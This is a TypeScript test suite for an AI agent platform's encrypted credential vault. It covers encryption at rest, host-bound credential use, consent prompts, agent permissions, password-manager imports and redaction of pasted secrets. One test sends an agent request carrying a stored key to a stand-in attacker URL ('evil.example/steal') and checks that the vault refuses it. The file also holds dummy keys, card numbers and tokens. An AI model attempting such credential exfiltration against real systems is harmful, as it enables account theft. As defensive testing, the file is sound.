import { mkdir, mkdtemp, readFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { Redactor } from "@redgiant/events";
import type { VaultView } from "@redgiant/protocol";
import { describe, expect, it } from "vitest";
import {
  blankPastedSecrets,
  fileKeyStore,
  type MasterKeyStore,
  Vault,
  type VaultCaller,
  type VaultRoute,
} from "../src/vault.js";
import { detectFormat, parseCsv, readExport } from "../src/vault-import.js";
import { OTHER, startServer } from "./helpers.js";

const KEY = "rk_live_Zq81mXv3PdQw7Tn2LbYc";

const memKeys = (): MasterKeyStore & { key: Buffer | null } => {
  const s = {
    kind: "file" as const,
    key: null as Buffer | null,
    load: async () => s.key,
    save: async (k: Buffer) => {
      s.key = k;
    },
  };
  return s;
};

function fakeFetch() {
  const calls: { url: string; init: RequestInit }[] = [];
  const f = (async (url: string | URL, init: RequestInit = {}) => {
    calls.push({ url: String(url), init });
    const auth = new Headers(init.headers).get("authorization") ?? "";
    return new Response(JSON.stringify({ ok: true, echoed: auth, raw: KEY }), {
      status: 200,
      headers: { "content-type": "application/json" },
    });
  }) as typeof fetch;
  return { f, calls };
}

const caller = (over: Partial<VaultCaller> = {}): VaultCaller => ({
  ownerId: "me",
  agentId: "agent_1",
  agentName: "Ada",
  sessionId: "sess_1",
  tool: "use_credential",
  ...over,
});

async function vault(o: Partial<ConstructorParameters<typeof Vault>[0]> = {}) {
  const dir = join(await mkdtemp(join(tmpdir(), "rg-vault-")), "keychain");
  const keys = memKeys();
  const v = new Vault({ dir, keyStores: [keys], ...o });
  await v.open();
  return { v, dir, keys };
}

const revolut = {
  name: "revolut_api",
  service: "Revolut",
  value: KEY,
  hosts: ["b2b.revolut.com"],
};

describe("the keychain at rest (G33.4)", () => {
  it("seals every value with AES-256-GCM; the same key opens it, another does not", async () => {
    const { v, dir, keys } = await vault();
    expect(v.ready).toBe(true);
    await v.put("me", { ...revolut, username: "mario" });
    const file = await readFile(join(dir, "keychain.enc"), "utf8");
    expect(file).not.toContain(KEY);
    expect(file).not.toContain("revolut");
    expect(JSON.parse(file)).toMatchObject({ v: 1 });
    // Again from disk with the same key.
    const again = new Vault({ dir, keyStores: [keys] });
    await again.open();
    expect(again.reveal("me", "revolut_api")).toBe(KEY);
    // A wrong key: closed, with a reason, never half-open.
    const wrong = memKeys();
    wrong.key = Buffer.alloc(32, 7);
    const other = new Vault({ dir, keyStores: [wrong] });
    await other.open();
    expect(other.ready).toBe(false);
    expect((await other.view("me")).reason).toBeTruthy();
    // The folder tells git to keep out.
    expect(await readFile(join(dir, ".gitignore"), "utf8")).toContain("*");
  });

  it("refuses to open inside a git repository", async () => {
    const repo = await mkdtemp(join(tmpdir(), "rg-repo-"));
    await mkdir(join(repo, ".git"));
    const v = new Vault({ dir: join(repo, "data", "keychain"), keyStores: [memKeys()] });
    await v.open();
    expect(v.ready).toBe(false);
    const view = await v.view("me");
    expect(view.reason).toContain("git repository");
    await expect(v.put("me", revolut)).rejects.toThrow(/git repository/);
  });

  it("keeps the master key in a 0600 file on Linux", async () => {
    const dir = join(await mkdtemp(join(tmpdir(), "rg-vault-")), "keychain");
    const v = new Vault({ dir, keyStores: [fileKeyStore(join(dir, "master.key"))] });
    await v.open();
    expect(v.ready).toBe(true);
    if (process.platform !== "win32") {
      const { stat } = await import("node:fs/promises");
      expect((await stat(join(dir, "master.key"))).mode & 0o777).toBe(0o600);
    }
    expect((await v.view("me")).protection).toBe("file");
  });

  it("never shows a value: the list has its length, the log's Redactor hides it", async () => {
    const redactor = new Redactor();
    const { v } = await vault({ redactor });
    await v.put("me", revolut);
    const view: VaultView = await v.view("me");
    expect(JSON.stringify(view)).not.toContain(KEY);
    expect(view.entries[0]).toMatchObject({ name: "revolut_api", length: KEY.length });
    expect(redactor.redactText(`the key is ${KEY}`).text).not.toContain(KEY);
    // Another owner sees nothing of it.
    expect((await v.view("someone")).entries).toEqual([]);
    expect(() => v.reveal("someone", "revolut_api")).toThrow();
    // Editing without a value keeps the value.
    const [e] = view.entries;
    await v.put("me", { ...revolut, value: undefined, notes: "business account" }, e?.id);
    expect(v.reveal("me", "revolut_api")).toBe(KEY);
  });
});

describe("agents use a credential by name (G33.4)", () => {
  it("puts it on the request only towards its hosts, and hides it in the answer", async () => {
    const { f, calls } = fakeFetch();
    const { v } = await vault({ fetch: f, ask: async () => true });
    await v.put("me", { ...revolut, ask: "never" });
    const ok = await v.request(caller(), {
      credential: "revolut_api",
      method: "GET",
      url: "https://b2b.revolut.com/api/1.0/accounts",
      headers: {},
    });
    expect(ok.isError).toBeUndefined();
    expect(calls).toHaveLength(1);
    expect(new Headers(calls[0]?.init.headers).get("authorization")).toBe(`Bearer ${KEY}`);
    expect(calls[0]?.init.redirect).toBe("manual");
    expect(ok.content).not.toContain(KEY);
    expect(ok.content).toContain("[vault:revolut_api]");
    // Elsewhere: refused before any request.
    const no = await v.request(caller(), {
      credential: "revolut_api",
      method: "GET",
      url: "https://evil.example/steal",
      headers: {},
    });
    expect(no.isError).toBe(true);
    expect(no.content).toContain("not among its hosts");
    expect(calls).toHaveLength(1);
    // The placeholder, where the agent writes it.
    await v.request(caller(), {
      method: "POST",
      url: "https://b2b.revolut.com/api/1.0/pay",
      headers: { "x-api-key": "{{vault:revolut_api}}" },
      body: "{}",
    });
    expect(new Headers(calls[1]?.init.headers).get("x-api-key")).toBe(KEY);
    expect(new Headers(calls[1]?.init.headers).get("authorization")).toBeNull();
    // Every use, refused or not, is in the record; never the value.
    const uses = (await v.view("me")).uses;
    expect(uses.map((u) => u.outcome).sort()).toEqual(["refused", "used", "used"]);
    expect(uses.find((u) => u.outcome === "refused")?.host).toBe("evil.example");
    expect(JSON.stringify(uses)).not.toContain(KEY);
  });

  it("asks the person: once per conversation, every time, or never; a no is a no", async () => {
    const asked: string[] = [];
    let answer = true;
    const { f } = fakeFetch();
    const { v } = await vault({
      fetch: f,
      ask: async (c) => {
        asked.push(c.sessionId ?? "");
        return answer;
      },
    });
    const e = await v.put("me", revolut); // default: once per conversation
    const go = (sessionId: string) =>
      v.request(caller({ sessionId }), {
        credential: "revolut_api",
        method: "GET",
        url: "https://b2b.revolut.com/x",
        headers: {},
      });
    await go("s1");
    await go("s1");
    await go("s2");
    expect(asked).toEqual(["s1", "s2"]);
    await v.put("me", { ...revolut, value: undefined, ask: "always" }, e.id);
    await go("s1");
    await go("s1");
    expect(asked).toHaveLength(4);
    answer = false;
    const r = await go("s3");
    expect(r.isError).toBe(true);
    expect(r.content).toContain("said no");
    // A failing question is a no too.
    const broken = await vault({
      fetch: f,
      ask: async () => {
        throw new Error("timeout");
      },
    });
    await broken.v.put("me", revolut);
    expect(
      (
        await broken.v.request(caller(), {
          credential: "revolut_api",
          method: "GET",
          url: "https://b2b.revolut.com/x",
          headers: {},
        })
      ).isError,
    ).toBe(true);
  });

  it("follows who may use it: agents, automations, tools", async () => {
    const { f } = fakeFetch();
    const { v } = await vault({ fetch: f, ask: async () => true });
    await v.put("me", {
      ...revolut,
      ask: "never",
      allow: { allAgents: false, agents: ["agent_ok"], tools: [], automations: ["auto_1"] },
    });
    const req = (c: VaultCaller) =>
      v.request(c, {
        credential: "revolut_api",
        method: "GET",
        url: "https://b2b.revolut.com/x",
        headers: {},
      });
    expect((await req(caller({ agentId: "agent_no" }))).content).toContain("this agent may not");
    expect((await req(caller({ agentId: "agent_ok" }))).isError).toBeUndefined();
    expect((await req(caller({ agentId: "agent_ok", automationId: "auto_2" }))).content).toContain(
      "this automation may not",
    );
    expect((await req(caller({ automationId: "auto_1" }))).isError).toBeUndefined();
    // Unknown names say where the person adds them.
    const none = await v.request(caller(), {
      credential: "nope",
      method: "GET",
      url: "https://b2b.revolut.com/x",
      headers: {},
    });
    expect(none.content).toContain("Settings > Keychain");
  });

  it("gives a bound tool the proxy's address for it, never the value", async () => {
    const published: VaultRoute[][] = [];
    const { v } = await vault({
      ask: async () => true,
      egress: { url: "http://egress:3128", publish: async (r) => void published.push(r) },
    });
    await v.put("me", {
      ...revolut,
      ask: "never",
      allow: { allAgents: true, agents: [], tools: ["revolut_balance"], automations: [] },
    });
    await v.put("me", {
      name: "other_key",
      service: "Other",
      value: "x".repeat(20),
      hosts: ["a.example"],
    });
    const env = await v.toolEnv(caller({ tool: "revolut_balance" }));
    expect(Object.keys(env)).toEqual(["REDGIANT_VAULT_REVOLUT_API"]);
    expect(env.REDGIANT_VAULT_REVOLUT_API).toMatch(/^http:\/\/egress:3128\/vault\/[\w-]{20,}$/);
    expect(JSON.stringify(env)).not.toContain(KEY);
    expect(await v.toolEnv(caller({ tool: "some_other_tool" }))).toEqual({});
    // Only credentials bound to a tool reach the proxy.
    expect(published.at(-1)?.map((r) => r.name)).toEqual(["revolut_api"]);
  });
});

describe("importing and exporting (G33.4)", () => {
  it("reads Bitwarden, 1Password, Chrome and Firefox exports", () => {
    const bw =
      'folder,favorite,type,name,notes,fields,reprompt,login_uri,login_username,login_password,login_totp\n,,login,"Posta, lavoro","a ""note""",,0,https://mail.example.com,mario,"pa,ss1",\n,,note,Solo nota,,,,,,,\n';
    expect(detectFormat(parseCsv(bw)[0] ?? [])).toBe("bitwarden");
    const b = readExport(bw);
    expect(b.rows).toEqual([
      {
        service: "Posta, lavoro",
        username: "mario",
        value: "pa,ss1",
        url: "https://mail.example.com",
        notes: 'a "note"',
      },
    ]);
    expect(b.skipped).toBe(1);
    const chrome =
      "name,url,username,password,note\r\nexample.com,https://example.com/login,me,pw2,\r\n";
    expect(readExport(chrome)).toMatchObject({
      format: "chrome",
      rows: [{ service: "example.com", value: "pw2" }],
    });
    const ff =
      '"url","username","password","httpRealm","formActionOrigin","guid","timeCreated","timeLastUsed","timePasswordChanged"\n"https://shop.example","anna","pw3",,"https://shop.example","{x}","1","1","1"\n';
    expect(readExport(ff)).toMatchObject({
      format: "firefox",
      rows: [{ service: "shop.example", username: "anna", value: "pw3" }],
    });
    const op =
      "Title,Url,Username,Password,OTPAuth,Favorite,Archived,Tags,Notes\nBank,https://bank.example,me,pw4,,false,false,,hi\n";
    expect(readExport(op)).toMatchObject({
      format: "1password",
      rows: [{ service: "Bank", value: "pw4", notes: "hi" }],
    });
  });

  it("previews without values, saves what the person keeps, for the person only", async () => {
    const { v } = await vault();
    const p = v.previewImport(
      "me",
      "name,url,username,password,note\nShop,https://shop.example,me,secret-pw-1,\nShop,https://shop.example,you,secret-pw-2,\n",
    );
    expect(JSON.stringify(p)).not.toContain("secret-pw");
    expect(p.rows.map((r) => r.name)).toEqual(["shop", "shop_2"]);
    expect(await v.confirmImport("me", p.id, [1])).toBe(1);
    const [e] = (await v.view("me")).entries;
    expect(e).toMatchObject({
      username: "you",
      hosts: ["shop.example"],
      category: "login",
      ask: "always",
    });
    expect(e?.allow.allAgents).toBe(false);
    expect(v.reveal("me", e?.id ?? "")).toBe("secret-pw-2");
    // An import is used once, by its owner.
    await expect(v.confirmImport("me", p.id, [0])).rejects.toThrow();
  });

  it("exports sealed with a passphrase and reads it back; a wrong passphrase fails", async () => {
    const a = await vault();
    await a.v.put("me", revolut);
    const file = a.v.exportSealed("me", "correct horse battery");
    expect(file).not.toContain(KEY);
    expect(file.startsWith("REDGIANT-KEYCHAIN 1\n")).toBe(true);
    expect(() => a.v.exportSealed("me", "short")).toThrow(/8 characters/);
    const b = await vault();
    await expect(b.v.importSealed("me", file, "wrong passphrase")).rejects.toThrow(
      /Wrong passphrase/,
    );
    expect(await b.v.importSealed("me", file, "correct horse battery")).toBe(1);
    expect(b.v.reveal("me", "revolut_api")).toBe(KEY);
    // The same again: nothing doubled.
    expect(await b.v.importSealed("me", file, "correct horse battery")).toBe(0);
  });
});

describe("secrets pasted in a chat (G33.4)", () => {
  it("are blanked with the memory's own cases, and talk about passwords is left alone", () => {
    for (const secret of [
      "My password is hunter2",
      "la password del wifi è Banana42",
      "Il mio PIN è 1234",
      "carta 4111 1111 1111 1111",
      "IBAN IT60 X054 2811 1010 0000 0123 456",
      "api key sk-proj-abc123def456ghi789jkl012",
      "token ghp_0123456789abcdefghijABCDEFGHIJ0123456789",
      `la chiave di Revolut è ${KEY}`,
    ]) {
      const out = blankPastedSecrets(secret);
      expect(out, secret).toContain("[secret removed]");
      expect(out).toContain("Settings > Keychain");
    }
    expect(blankPastedSecrets("My password is hunter2")).not.toContain("hunter2");
    expect(
      blankPastedSecrets("My password is hunter2").startsWith("My password is [secret removed]"),
    ).toBe(true);
    for (const fact of [
      "Uses a password manager",
      "il password manager è comodo",
      "uso il PIN sul telefono",
      "La password del wifi è lunga",
      "Usa i token di GitHub per il lavoro",
      "Runs models with a 32k token context",
      "Born in 1988",
    ])
      expect(blankPastedSecrets(fact)).toBe(fact);
  });

  it("never reach the model nor the log; agents get use_credential", async () => {
    const s = await startServer([{ text: "Ok." }]);
    try {
      const god = await s.api<{ id: string }>("POST", "/api/agents", {
        kind: "god",
        parentId: null,
        name: "God",
      });
      const sid = await s.core.startSession("me", god.body.id);
      const { done } = await s.core.send("me", sid, `the Revolut key is ${KEY}`, { watch: true });
      await done;
      const req = s.provider.requests[0];
      expect(JSON.stringify(req?.messages)).not.toContain(KEY);
      expect(JSON.stringify(req?.messages)).toContain("[secret removed]");
      expect(req?.tools?.some((t) => t.name === "use_credential")).toBe(true);
      const events = await s.core.history("me", sid);
      expect(JSON.stringify(events)).not.toContain(KEY);
      // The page's keychain: saved, listed without the value, shown only on request.
      const saved = await s.api<{ id: string }>("POST", "/api/vault", revolut);
      expect(saved.status).toBe(200);
      const view = await s.api<VaultView>("GET", "/api/vault");
      expect(view.body.ready).toBe(true);
      expect(JSON.stringify(view.body)).not.toContain(KEY);
      const shown = await s.api<{ value: string }>("POST", `/api/vault/${saved.body.id}/reveal`);
      expect(shown.body.value).toBe(KEY);
      const bad = await s.api<{ code: string }>("POST", "/api/vault", { ...revolut });
      expect(bad.body.code).toBe("vault_name_taken");
      // Someone else gets nothing.
      const theirs = await s.api<VaultView>("GET", "/api/vault", undefined, OTHER);
      expect(theirs.body.entries ?? []).toEqual([]);
    } finally {
      await s.close();
    }
  });
});
